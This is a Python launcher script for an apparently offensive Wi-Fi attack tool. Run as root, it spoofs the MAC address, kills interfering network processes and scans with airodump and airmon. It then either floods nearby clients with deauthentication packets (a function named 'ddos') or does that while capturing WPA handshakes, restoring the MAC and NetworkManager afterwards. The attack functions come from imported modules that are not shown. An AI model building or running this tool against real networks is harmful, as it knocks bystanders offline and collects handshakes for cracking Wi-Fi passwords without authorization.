#!/usr/bin/env python3

from os import geteuid
from mods.functions import *
from mods.args import *
import threading
import sys

if geteuid() != 0:
    sys.exit(color.YELLOW+"Run as root!"+color.END)
if args.Handshake:
    print(banner)
    try:
        get_interface()
    except KeyboardInterrupt:
        sys.exit(color.RED+"\n[-] Keyboard Interrupt"+color.END)

    try:
        change_mac()
        check_kill()
        airodump()
        read_dump()
        airmon()
        read_dump_s()
        t1 = threading.Thread(target=ddos)
        t2 = threading.Thread(target=handshake)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    except KeyboardInterrupt:
        print(color.RED+"\n[-] Keyboard Interrupt"+color.END)
        NetworkManager()
        reset_mac()
    except:
        print(color.RED+"\n[-] Unknown error"+color.END)
        NetworkManager()
        reset_mac()


elif args.Dos:
    print(banner)
    try:
        get_interface()
    except:
        sys.exit(color.RED+"\n[-] Keyboard Interrupt"+color.END)
    try:
        change_mac()
        check_kill()
        airodump()
        read_dump()
        airmon()
        read_dump_s()
        ddos()
    except KeyboardInterrupt:
        print(color.RED+"\n[-] Keyboard Interrupt"+color.END)
        NetworkManager()
        reset_mac()
    except:
        print(color.RED+"\n[-] Unknown error"+color.END)
        NetworkManager()
        reset_mac()
else:
    parser.error("Select a mode")
